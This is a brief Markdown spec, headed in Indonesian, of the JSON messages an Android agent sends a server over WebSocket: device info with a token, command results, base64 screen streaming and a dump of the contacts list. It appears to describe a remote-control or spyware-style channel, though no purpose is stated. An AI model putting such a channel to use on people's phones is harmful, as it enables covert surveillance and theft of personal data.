# Protokol WebSocket

## Agent → Server
```json
{"t":"hello","token":"…","info":{"brand":"Xiaomi","model":"Redmi","android":"14","sdk":34}}
{"t":"result","id":"abc","ok":true,"data":{…}}
{"t":"stream","kind":"screen","b64":"…"}
{"t":"dump","kind":"contacts","name":"contacts_x.json","b64":"…"}
{"t":"ping"}
